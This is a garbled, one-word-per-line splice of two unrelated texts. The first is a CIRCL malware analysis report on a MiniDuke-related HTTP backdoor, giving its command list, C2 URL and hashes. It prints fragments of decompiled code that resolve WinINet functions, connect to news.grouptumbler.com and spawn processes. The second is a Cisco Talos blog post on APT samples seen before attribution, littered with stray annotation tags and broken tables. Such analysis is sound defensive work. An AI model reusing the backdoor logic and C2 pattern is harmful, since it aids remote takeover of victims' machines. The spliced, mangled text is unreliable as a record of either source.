a1015f0b99106ae2852d740f366e15c1d5c711f57680a2f04be0283e8310f69e
–
Filesize
*
333824
Bytes
(
326KB
)
–
Compile
time
*
Mon
Jun
18
16:28:11
2012
•
Sample
B
-
Derrived
from
Sample
A
–
Description
*
Dumped
memory
region
0x0D060169
to
0x0d08b000
after
de-obfuscation
and
UCL
decompression
2
–
Original
filename
*
Extracted
from
memory
,
no
filename
–
Hashes
*
MD5
:
1a2edd2db71fd41e963011da8caf26cc
*
SHA1
:
f344becb220de6ffa4d7223bdb82146d3b1c93ed
*
SHA-256
:
b61d409b6c1066e0c1fc4fe15f6f367be31fa2cc555cfc0ef7eeb8e5759380c0
–
Filesize
*
175767
Bytes
(
172KB
)
–
Compile
time
*
Mon
Mar
5
14:17:08
2012
1http://www.securelist.com/en/downloads/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor.pdf
2http://www.oberhumer.com/opensource/ucl/
Page
3
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
2.1
Limitations
This
work
has
been
done
with
utmost
care
,
following
best
practices
in
software
reversing
,
forensic
investigations
and/or
information
gathering
.

However
,
the
work
is
only
covering
small
aspects
(
based
on
the
indicators
given
,
lacking
full
context
)
and
not
an
exhaustive
analysis
,
and
hence
the
report
is
as-is
,
not
giving
any
guarantees
of
completeness
or
claiming
absolute
accuracy
.

2.2
Sharing
The
document
is
classified
as
TLP
:
WHITE
,
therefore
CIRCL
encourages
everyone
to
share
this
analysis
report
as-is
without
modification
.

3
Executive
summary
Sample
B
,
contained
in
Sample
A
,
can
be
categorized
as
an
exhaustive
backdoor
,
implementing
any
kind
of
functionality
that
can
be
expected
for
this
kind
of
attacks
.

Despite
the
fact
that
it
does
n't
implement
any
particular
fancy
or
new
technique
,
the
code
quality
appears
to
be
clean
and
robust
,
making
rich
use
of
C
structures
and
logging
and
it
shows
on
some
places
that
it
is
targeting
organizational
infrastructures
rather
than
home
users
.

4
Analysis
4.1
Summary
Sample
A
can
be
categorized
as
a
container
,
obfuscating
and
compressing
the
real
payload
.

Sample
A
has
been
debugged
until
Sample
B
's
decompression
finished
.

The
memory
segment
was
dumped
to
disk
for
further
analysis
.

The
focus
of
the
analysis
then
shifted
to
Sample
B
.

Sample
B
is
identified
to
be
a
HTTP
controlled
backdoor
,
enabling
the
attacker
to
take
full
control
over
the
victim
computer
.

4.2
Techniques
used
The
analysis
has
been
done
using
a
mixed-approach
of
dynamic
analysis
and
static
analysis
in
order
to
overcome
some
of
the
obfuscation
and
encryptions
used
by
the
malware
.

Some
of
the
techniques
might
have
also
an
impact
on
the
interpretation
of
the
malware
.

Unfortunately
,
when
we
started
this
investigation
,
the
domain
is
now
pointing
to
an
IP
address
of
Google
and
returning
a
404
Not
Found
page
only
.

An
interaction
following
the
protocol
of
this
malware
is
therefore
no
longer
possible
.

4.3
Implemented
commands
The
analysis
of
Sample
B
revealed
the
commands
as
shown
in
table
1
Page
4
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
mv
cp
rm
pwd
cd
exew
conf
cdt
dev
time
info
exit
dir/ls
exec
exeu
put
get
rmdir
mkdir
pskill/kill
pslist/ps
Table
1
:
Implemented
commands
move
a
file
copy
a
file
delete
a
file
get
current
directory
change
current
directory
delete
directory
create
directory
kill
a
process
execute
command
show
backdoor
configuration
change
to
temp
directory
get
a
list
of
device
drives
get
uptime
of
machine
get
path
to
the
backdoor
,
computer
name
,
username
,
process
information
exit
get
the
content
of
a
directory
execute
command
interactively
execute
command
interactively
as
specified
domain
user
upload
a
file
download
a
file
get
a
list
of
running
processes
4.4
Control
The
attacker
controls
the
remote
computer
via
HTTP
GET
and
POST
requests
like
the
following
:
1
*
http
:
//news.grouptumbler
.com/news/feed.php
?

i=Me3tMZEHAuvkc~uJsO~W7lX1vSsgkuW99vD3FRgi
The
request
is
encoded
in
a
custom
BASE64
encoding
,
using
the
following
alphabet
:
1
*
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
$
~
4.5
IOC
4.5.1
Network
The
malware
connects
via
HTTP
GET
and
POST
requests
to
1
*
http
:
//news.grouptumbler
.com/
and
the
path
is
fixed
:
1
*
/news/
feed.php
?

i=
The
variable
part
is
the
custom
BASE64
encoded
string
corresponding
to
'i=
'
.

A
full
request
looks
like
:
1
*
http
:
//news.grouptumbler
.com/news/feed.php
?

i=
{
Custom
BASE64
}
The
user
agent
is
always
Page
5
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
1
*
Mozilla
/4.0
Sent
accept
headers
are
:
1
*
Accept
:
*/*
4.5.2
Registry
The
malware
creates
in
1
*
HKCU\Software\Microsoft\ApplicationManager
a
value
'AppID
'
with
the
data
it
calculates
from
GetTickcount
(
)
,
used
as
an
identifier/mutex
.

4.6
Persistency
No
persistency
mechanisms
have
been
identified
.

We
assume
the
file
is
only
dropped
and/or
executed
on
request
via
stage
2
of
Miniduke
and
not
running
persistently
.

4.7
Execution
process
Sample
A
.

UCL
decompression
Sample
B
Sample
B
execution
Update
on
Jul
03
2014
:
F-Secure
released
an
analysis3
of
the
latest
MiniDuke
evolution
,
called
'CosmicDuke
'
,
mentioning
similar
loaders
in
old
and
new
samples
.

That
's
why
we
updated
this
document
to
include
a
graph
of
the
loader
:
3http://www.f-secure.com/static/doc/labs_global/Whitepapers/cosmicduke_whitepaper.pdf
Page
6
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
Page
7
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
5
Interesting
code
parts
5.1
Init
phase
of
Sample
B
Decryption
of
module
and
function
names
lpProcName
)
;
lpProcName
)
;
(
hModule
)
lpProcName
)
;
wininet.dll
=
decrypt_string
(
&
enc_wininet_dll
)
;
hModule
=
LoadLibraryA
(
wininet.dll
)
;
i
f
{
1
int
decode_functions_and_start_internet_loop
(
)
2
{
3456789
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
}
lpProcName
=
decrypt_string
(
&
enc_InternetOpenA
)
;
InternetOpenA
=
GetProcAddress
(
hModule
,
lpProcName
=
decrypt_string
(
enc_InternetConnectA
)
;
InternetConnectA
=
GetProcAddress
(
hModule
,
lpProcName
=
decrypt_string
(
&
enc_InternetSetOptionA
)
;
InternetSetOptionA
=
GetProcAddress
(
hModule
,
lpProcName
=
decrypt_string
(
&
enc_HttpOpenRequestA
)
;
HttpOpenRequestA
=
GetProcAddress
(
hModule
,
lpProcName
=
decrypt_string
(
&
enc_HttpSendRequestA
)
;
HttpSendRequestA
=
GetProcAddress
(
hModule
,
lpProcName
=
decrypt_string
(
&
enc_HttpQueryInfoA
)
;
HttpQueryInfoA
=
GetProcAddress
(
hModule
,
lpProcName
=
decrypt_string
(
&
enc_InternetReadFile
)
;
InternetReadFile
=
GetProcAddress
(
hModule
,
lpProcName
)
;
lpProcName
=
decrypt_string
(
&
enc_InternetCloseHandle
)
;
InternetCloseHandle
=
GetProcAddress
(
hModule
,
port
=
parse_int
(
'80
'
)
;
delay
=
parse_int
(
'61
'
)
;
generate_identifier_and_setup_jumptable
(
&
instance
)
;
internet_loop
(
&
instance
)
;
ExitThread
(
0
)
;
}
return
0
;
lpProcName
)
;
lpProcName
)
;
lpProcName
)
;
lpProcName
)
;
5.2
Decrypt
and
setup
registry
keys
1
decrypt_registry_keys_and_set_id
(
)
2
{
34result
=
0
;
str_Software_Microsoft_ApplicationManager
=
decrypt_string
(
&
enc_Software_Microsoft_ApplicationManager
)
;
(
RegCreateKeyA
(
HKEY_CURRENT_USER
,
str_Software_Microsoft_ApplicationManager
,
&
hKey
)
)
i
f
{
}
else
{
re
sult
=
0
;
56789
10
11
12
13
14
15
16
17
dwType
=
4
;
cbData
=
4
;
str_AppID
=
decrypt_string
(
&
enc_AppID
)
;
i
f
(
(
RegQueryValueExA
(
hKey
,
str_AppID
,
0
,
&
dwType
,
&
result
,
&
cbData
)
4
)
|
|
dwType
!
=
&
&
(
dwType
=
4
,
result
=
get_tickcount_based_value
(
)
,
RegSetValueExA
(
hKey
,
str_AppID
,
0
,
dwType
,
&
result
,
4u
)
)
)
Page
8
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
else
RegCloseKey
(
hKey
)
;
RegCloseKey
(
hKey
)
;
}
return
re
sult
;
18
19
20
21
22
23
}
5.3
evaluate
commands
(
extract
)
and
error
handling
123456789
10
i
f
{
}
!

lstrcmpA
(
&
this
(
cid:0
)
>
command
,
'pwd
'
)
)
(
ret
(
cid:0
)
>
return
=
(
cid:0
)
127
;
i
f
{
!

GetCurrentDirectoryA
(
0x400u
,
&
ret
(
cid:0
)
>
message
)
)
(
this
(
cid:0
)
>
command
=
GetLastError
(
)
;
FormatMessageA
(
0x1000u
,
0
,
this
(
cid:0
)
>
command
,
0
,
&
ret
(
cid:0
)
>
message
,
0x400u
,
0
)
;
}
ret
(
cid:0
)
>
len
+=
lstrlenA
(
&
ret
(
cid:0
)
>
message
)
+
1
;
5.4
Internet
connect
internet_connect
(
struct_this_7
*this
)
else
!
=
'*
'
buffer
=
10000
;
if1
signed
int
__thiscall
2
{
3456789
10
11
12
13
14
15
(
this
(
cid:0
)
>
hInternetOpen
)
i
f
{
|
|
url
[
1
]
(
url
[
0
]
lstrcpyA
(
&
host
,
'news.grouptumbler
.com
'
)
;
wnsprintfA
(
&
host
,
256
,
'
%
x
%
s
'
,
*
&
this
(
cid:0
)
>
path
,
0x409001
)
;
!
=
'
.
'

)
use_proxy
=
0
;
buffer
=
3
;
this
(
cid:0
)
>
hInternetOpen
=
InternetOpenA
(
'
Mozilla
/4.0
'
,
0
,
0
,
0
,
0
)
;
i
f
{
(
use_proxy
)
success_setoption
=
InternetSetOptionA
(
this
(
cid:0
)
>
hInternetOpen
,
INTERNET_OPTION_PROXY
i
f
{
,
&
buffer
,
12
)
;
!

success_setoption
)
(
InternetCloseHandle
(
this
(
cid:0
)
>
hInternetOpen
)
;
return
0
;
4
)
;
4
)
;
}
InternetSetOptionA
(
this
(
cid:0
)
>
hInternetOpen
,
INTERNET_OPTION_CONNECT_TIMEOUT
,
&
buffer
,
InternetSetOptionA
(
this
(
cid:0
)
>
hInternetOpen
,
INTERNET_OPTION_RECEIVE_TIMEOUT
,
&
buffer
,
success_setoption
=
InternetSetOptionA
(
this
(
cid:0
)
>
hInternetOpen
,
LOWORD
(
success_setoption
)
=
port
;
this
(
cid:0
)
>
hSession
=
InternetConnectA
(
this
(
cid:0
)
>
hInternetOpen
,
&
host
,
i
f
InternetCloseHandle
(
this
(
cid:0
)
>
hInternetOpen
)
;
INTERNET_OPTION_CONTROL_SEND_TIMEOUT
,
&
buffer
,
4
)
;
(
this
(
cid:0
)
>
hSession
)
return
1
;
0
,
INTERNET_SERVICE_HTTP
,
0
,
0
)
;
success_setoption
,
0
,
}
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
}
Page
9
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
return
0
;
31
32
}
5.5
Create
process
calls
Command
'exec
'
-
standard
process
creation
:
1
hProcess
=
CreateProcessA
(
0
,
&
this
(
cid:0
)
>
cmdline
,
0
,
0
,
231
,
0x14u
,
0
,
0
,
&
this
(
cid:0
)
>
startupinfo_a
,
&
this
(
cid:0
)
>
process_information
)
4
Command
'exeu
'
-
process
creation
in
a
domain
environment
1234
hProcess
=
CreateProcessWithLogonW
(
&
Username
,
&
Domain
,
lpPassword
,
0
,
0
,
&
CommandLine
,
4u
,
0
,
&
CurrentDirectory
,
&
this
(
cid:0
)
>
startupinfo_b
,
&
this
(
cid:0
)
>
process_information
)
6
Related
indicators
information
6.1
Network
infrastructure
The
domain
news.grouptumbler.com
is
currently
resolving
to
173.194.70.101
seen
2013
(
cid:0
)
03
(
cid:0
)
03
01:57:37
(
cid:0
)
0000
seen
2013
(
cid:0
)
03
(
cid:0
)
06
23:34:47
(
cid:0
)
0000
1first2last3
news.grouptumbler
.com
.

A
173.194.70.101
Before
that
date
,
the
IP
was
200.63.46.33
seen
2012
(
cid:0
)
03
(
cid:0
)
14
14:21:10
(
cid:0
)
0000
1first
seen
2013
(
cid:0
)
02
(
cid:0
)
26
22:04:07
(
cid:0
)
0000
2last3
news.grouptumbler
.com
.

A
200.63.46.23
The
IP
200.63.46.33
was
hosting
the
following
domains
:
1
dvdform
.com
.

A
200.63.46.23
2
www
.

dvdform
.com
.

A
200.63.46.23
3
www
.

p90xprice
.com
.

A
200.63.46.23
4
dexterseason
.com
.

A
200.63.46.23
5
www
.

dexterseason
.com
.

A
200.63.46.23
6
news.grouptumbler
.com
.

A
200.63.46.23
7
www
.

babylearningdvd
.com
.

A
200.63.46.23
8
turbofirecoupon
.com
.

A
200.63.46.23
9
www
.

turbofirecoupon
.com
.

A
200.63.46.23
10
smallvilledvdset
.com
.

A
200.63.46.23
11
www
.

smallvilledvdset
.com
.

A
200.63.46.23
12
miamivicedvdboxset
.com
.

A
200.63.46.23
13
www
.

miamivicedvdboxset
.com
.

A
200.63.46.23
14
www
.

sexandthecityondvd
.com
.

A
200.63.46.23
15
www
.

sherlockholmesondvd
.com
.

A
200.63.46.23
16
trxforcekitoriginal
.com
.

A
200.63.46.23
17
www
.

trxforcekitoriginal
.com
.

A
200.63.46.23
18
weddingdressestoday
.com
.

A
200.63.46.23
19
www
.

maxheadroomdvdseries
.com
.

A
200.63.46.23
Page
10
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
None
,
some
or
all
domains
in
this
list
might
be
malicious
as
well
.

The
IP
address
200.63.46.33
is
currently
anounced
by
Panamaserver.com
1
20120426
20130311
52284
200.63.46.0/24
(
cid:0
)
2
http
:
//bgpranking.circl.lu
/asn_details
?
asn=52284
&
source=
&
date=
The
hosting
company
is
not
a
known
bulletproof
hoster
based
on
the
BGP
Ranking
informa-tion4
.

and
was
announced
by
two
other
ISPs
before
:
1
20110118
20120425
23520
200.63.46.0/24
(
cid:0
)
Columbus
network
2
20090601
20110117
27716
200.63.46.0/24
(
cid:0
)
Advanced
Communication
Network
,
S
.A
.

WHOIS
Panamaserver.com
1
inetnum
:
200.63.40/21
2
status
:
allocated
3
aut
(
cid:0
)
num
:
N/A
4
owner
:
Panamaserver
.com
5
ownerid
:
PA
(
cid:0
)
PANA2
(
cid:0
)
LACNIC
6
responsible
:
Ch
Group
Corp.7
address
:
Bella
Vista
,
El
cangrejo
,
Calle
49
,
0
,
8
address
:
00000
(
cid:0
)
Panama
(
cid:0
)
9
country
:
PA
10
phone
:
+507
263
3723
[
]
11
owner
(
cid:0
)
c
:
MAC30
12
tech
(
cid:0
)
c
:
MAC30
13
abuse
(
cid:0
)
c
:
MAC30
14
inetrev
:
200.63.46/24
15
nserver
:
NS1.PANAMASERVER.COM
4http://bgpranking.circl.lu/asn_details?date=2012-12-08
;
asn=52284
Page
11
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
July
3
,
2014
July
3
,
2014
July
3
,
2014
16
nsstat
:
20130311
AA
17
nslastaa
:
20130311
18
created
:
20080328
19
changed
:
20080328
20
21
nic
(
cid:0
)
hdl
:
MAC30
22
person
:
Manuel
I.Cabrera
Ch
.

23
e
(
cid:0
)
mail
:
ABUSE@PANAMASERVER.COM
24
address
:
Bella
Vista
Calle
39A
y
Ave
Cuba
,
0
,
25
address
:
0000
(
cid:0
)
Panama
(
cid:0
)
PA
26
country
:
PA
27
phone
:
+507
8322443
[
]
28
created
:
20071004
29
changed
:
20120311
Page
12
of
12
CIRCL
-
Computer
Incident
Response
Center
Luxembourg
c/o
smile
-
'security
made
in
Lëtzebuerg
'
GIE
41
,
avenue
de
la
gare
,
L-1611
Luxembourg
(
+352
)
247
88444
-
info@circl.lu
–
www.circl.lu
4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack

T
H
U
R
S
D
AY
,
J
A
N
U
A
R
Y
1
4
,
2
0
1
6

RESEARCH
SPOTLIGHT
:
NEEDLES
IN
A
HAYSTACK

This
post
was
authored
by
Mariano
Graziano
.

Malware
sandboxes
are
automated
dynamic
analysis
systems
that
execute
programs
in
a
controlled
environment
.

Within
the
large
volumes
of
samples
submitted
daily
to
these
services
,
some
submissions
appear
to
be
different
from
others
and
show
interesting
characteristics
.

At
USENIX
Security
2015
I
presented
a
paper
in
which
we
proposed
a
method
to
automatically
discover
malware
developments
from
samples
submitted
to
online
dynamic
analysis
systems
.

The
research
was
conducted
by
dissecting
the
Anubis
sandbox
dataset
which
consisted
of
over
30M
samples
collected
in
six
years
.

The
methodology
we
proposed
was
effective
and
we
were
able
to
detect
many
interesting
cases
in
which
the
malware
authors
directly
interacted
with
the
sandbox
during
the
development
phase
of
the
threats
.

Another
interesting
result
that
came
from
the
research
concerns
the
samples
attributed
to
Advanced
Persistent
Threat
(
APT B_malware.unknown
)
campaigns I
.

Surprisingly
,
some
of
the
malware
samples
used
in
these
sophisticated
attacks
had
been
submitted
to
the
Anubis
sandbox
months
--
sometimes
even
years
--
before
the
attack
had
been
attributed
to
the
proper

APT B_malware.unknown
campaign  I
by
a
security
vendor
.
To
be
perfectly
clear
,
we
are
not
saying
that
it
took
security
vendors
months
or
years
to
detect
a
threat
.
Most
times
,
we
are
able
to
detect
the
threats
in
no
more
than
a
few
hours
.
It
is
just
that
the
malware
samples
were
mislabeled
and
not
properly
associated
with
APT B_malware.unknown
campaigns I
.
In
general
,
the
same
goes
for
non-APT
malware
campaigns
.

In
this
blog
post
,
we
tried
to
see
if
the
same
applied
to
the
Cisco
dataset
.
Speci cally
,
we
chose
ten
APT B_malware.unknown
campaigns I
,
--
some
of
which
were
already
covered
in
the
Usenix
paper
.

We
decided
to
inspect
two
different
datasets
:
our
incoming
sample
feeds
/
malware
zoo
,
and
the
telemetry
associated
with
our
Advanced

Malware
Protection
(
AMP
)
solutions
.
Talos
receives
samples
from
over
100
external
feeds
ranging
from
anti-malware
companies
to
research
centers
,
while
the
AMP
dataset

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack
contains
telemetry
from
the
Cisco
AMP
user-base
.

The
remaining
part
of
this
post
is
organized
as
follows
.

First
,
we
show
the
APT B_malware.unknown
campaigns I
we
investigated
.

Second
,
we
summarize
the
results
of
the
analysis
of
the

Talos
dataset
.

Third
,
we
show
the
results
from
the
AMP
dataset
.

Finally
,
we
summarize
our
endings
.

APT B_malware.unknown
CAMPAIGNS I

APT B_malware.unknown
CAMPAIGN  I

Beebus B_malware.unknown

Arid  B_malware.unknown
Viper B_malware.unknown

Red B_malware.unknown
October B_malware.unknown

Equation  B_malware.unknown

Pacic  B_malware.unknown
RAT B_malware.backdoor

Regin B_malware.unknown

Aurora  B_malware.unknown

Pitty B_malware.unknown
Tiger B_malware.unknown

Net B_malware.unknown
Traveller B_malware.unknown

BrutPOS B_malware.unknown

MADE
PUBLIC

February
2013

February
2015

January
2013

February
2015

July
2014

November
2014

January
2010

July
2014

June
2013

July
2014

The
ten
malware B_malware.unknown
campaigns
in
the
table
above
garnered
signi cant
media
attention
when
discovered
,
with
some
of
them
clearly
falling
in
the
area
of
APT B_malware.unknown
.

They
were
found
by
different
security
companies
between
2010
and
2015
,
having
different
levels
of
sophistication
and
different
objectives
.
Moreover
,
these
APT B_malware.unknown
campaigns I
were
not
limited
to
western
countries
.

They
have
affected
organizations
all
over
the
world
.

Most
of
the
time
,
connecting
the
dots
and
drawing
relationships
between
samples
and
campaigns
take
months
and
many
experts
.

This
means
the
security
company
that
releases
a
detailed
report
documenting
the
campaign
is
aware
of
it
long
before
the
information
is
made
public
.

However
,
we
believe
the
'
public
release
'
date
is
still
a
good
metric
,
because
it
is
the
moment
at
which
all
the
other
security
companies
and
the
entire
world
are
made
aware
of
these
threats
.

Another
important
aspect
during
an
APT B_malware.unknown
investigation
is
attribution
.

While
detection
is
done
quickly
,
attribution
for
these
campaigns
is
often
an
open
and
hard
problem
to
solve
.

Most
of
the
times
the
perpetrators
remain
unknown
even
after
months
of
work
by

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack

Most
of
the
times
the
perpetrators
remain
unknown
even
after
months
of
work
by
security
researchers
.

However
,
sometimes
researchers
are
able
to
connect
the
dots
and
attribute
the
attack
to
a
threat
actor
.

This
was
the
case
for
some
of
the
APT B_malware.unknown
campaigns I
discussed
so
far
.

Some
of
these
threats
have
been
attributed
to
state-sponsored
actors
,
others
to
cyber
criminals
or
to
espionage
attacks
.

However
,
like
in
the
USENIX
publication
,
in
this
post
we
will
make
no
speculation
about
attribution
.

In
the
next
paragraphs
,
we
will
present
the
results
of
searching
for
samples
associated
with
these
APT B_malware.unknown
campaigns I
in
our
datasets
.

TALOS
DATASET

AVG
DAYS
BEFORE
APT B_malware.unknown
CAMPAIGN  I
PUBLICALLY

CAMPAIGN

Beebus

Arid
Viper

Red
October

Equation

Pacic
RAT

Regin

Aurora

Pitty
Tiger

Net
Traveller

BrutPOS

IDENTIFIED
1371
1018

This
table
shows
the
results
of
the
analysis
of
our
incoming
sample
feeds/malware B_malware.unknown
zoo I
.

For
every
campaign
,
we
checked
in
our
malware B_malware.unknown
zoo I
to
see
when
they
had
been
initially
submitted
to
us
.

Given
that
we
know
when
information
about
these
APT B_malware.unknown
campaigns I
was
made
public
,
we
can
compute
the
number
of
days
it
took
the
security
community
to
publicly
tie
the
samples
to
an
APT B_malware.unknown
campaign  I
,
even
though
the
samples
had
been
marked
malicious
for
other
reasons
.
On
average
,
these
samples
went
for
458
days
before
being
tied
to
an
APT B_malware.unknown
campaign  I
.

The
table
presents
the
average
number
of
days
for
the
entire
campaign
,
and
we
go
from
a
few
months
as
in
the
case
of
'
Aurora  B_malware.unknown
'
to
more
than
three
years
for
'
Equation  B_malware.unknown
'
.
Notice
that
these
 gures
come
from
our
malware B_malware.unknown
zoo I
which
collects
samples
from
external
sources
and
in
general
are
a
good
indicator
given
the
amount
of
samples
received
per
day
.

Notice
that
these
numbers
vary
based
on
the
dataset
.

4/10/2016
dataset
.

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack

VIRUS
TOTAL

The
vast
majority
of
the
submissions
come
from
big
organizations
such
as
Antivirus
companies
.

Interestingly
,
a
signi cant
percentage
is
submitted
by
VirusTotal
.
For
this
reason
we
decided
to
check
the
submitters
for
possible
links
and
intelligence
information
.

As
already
documented
by
Dixon
,
information
about
the
submitters
of
samples
is
not
publicly
available
,
but
can
partially
be
retrieved
from
their
Intelligence
service
.

For
every
sample
,
it
is
possible
to
know
a
hash  B_hash
(
a
hexadecimal
unique
identfier
of
the
submitter
)
,
the
country
(
from
the
geolocalization
of
the
IP
address
of
the
submitter
)
and
the
method
(
the
way
the
sample
has
been
submitted
,
for
instance
via
the
web
interface
or
the
APIs
)
.

This
opaque
information
complicates
the
analysis
a
little
bit
,
but
it
is
still
possible
to
obtain
interesting
results
.

SUBMITTER

CAMPAIGNS
6exxxxxx  B_hash
14xxxxxx  B_hash
22xxxxxx  B_hash
20xxxxxx  B_hash
5exxxxxx  B_hash
72xxxxxx  B_hash
4bxxxxxx  B_hash
3bxxxxxx  B_hash
cdxxxxxx  B_hash
b4xxxxxx  B_hash

AridViper B_malware.ransom
Nettraveller
RedOctober
BrutPOS

PittyTiger

AridViper B_malware.ransom
Regin

AridViper B_malware.ransom
Regin
Nettraveller
BrutPOS
PittyTiger

AridViper B_malware.ransom
Nettraveller
PacicRAT
BrutPOS

PittyTiger  B_malware.unknown

Equation  B_malware.unknown
Regin B_malware.unknown
BrutPOS B_malware.unknown
Auror B_malware.unknown

Equation  B_malware.unknown
Regin B_malware.unknown
BrutPOS B_malware.unknown

Regin B_malware.unknown

Regin B_malware.unknown

Beebus  B_malware.unknown
PittyTiger  B_malware.unknown
Nettraveller  B_malware.unknown
BrutPOS B_malware.unknown

Aurora  B_malware.unknown

The
table
above
summarizes
our
 ndings
from
VirusTotal
.

The
 rst
column
shows
the
hash
of
the
submitter
.

This
means
that
the
submitter
sent
one
or
more
samples
of
a
given
APT B_malware.unknown
campaign  I
to
VirusTotal
before
its
public
release
.

One
can
only
speculate
on
who
these
submitters
are
.

They
could
very
likely
be
the
threat
actors
themselves
,
testing
to
see
if
their
malware
is
detected
by
the
AV
companies
.

They
could
also
be
security
researchers
or
vendors
who
are
trying
to
get
information
from
VirusTotal
.

It
is
noteworthy
that
in
most
of
the
cases
the
same
submitters
uploaded
samples
belonging

4/10/2016

Cisco
Talos
Blog
:
Research
Spotlight
:
Needles
in
a
Haystack
noteworthy
that
in
most
of
the
cases
the
same
submitters
uploaded
samples
belonging
to
different
APT B_malware.unknown
campaigns I
.

CISCO
AMP

We
went
through
our
logs
to
search
for
entries
that
contained
hashes
related
to
the
ten

APT B_malware.unknown
campaigns
we
have
been
investigating
.
Interestingly
,
we
got
hits
for
eight
different
hashes
belonging
to
three
different
campaigns
that
were
discovered
on
Cisco
AMP
customer
machines
before
the
APT B_malware.unknown
campaign
was
publicly
identi ed
.

APT B_malware.unknown
CAMPAIGN  I
(
NUM

DAYS
BEFORE
APT B_malware.unknown
CAMPAIGN  I

OF
SAMPLES
)

PUBLICALLY
IDENTIFIED

Arid  B_malware.unknown
Viper I
(
1
SAMPLE
)

Equation  B_malware.unknown
(
1
SAMPLE
)

BrutPOS B_malware.unknown
(
6
SAMPLES
)

As
illustrated
in
the
table
above
,
we
identi ed
eight
malicious
samples
that
were
in
the
wild
before
being
associated
with
APT B_malware.unknown
campaigns I
.

It
is
important
to
repeat
that
most
of
these
samples
were
detected
as
malicious
the
moment
they
 rst
appeared
on
our
customers
'
machines
.

Surprisingly
,
one
sample
of
the
Equation
APT B_malware.unknown
campaign  I
(
fanny
worm
)
was
found
and
blocked
on
a
Cisco
AMP
customer's
machine
a
day
after
the
public
release
of
the

Kaspersky
report
.

HASH  B_hash
(
SHA256
)

DATE
DISPOSITION
APT B_malware.unknown
003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D9  B_hash
2015-02-17

malicious

EQUATION  B_malware.unknown
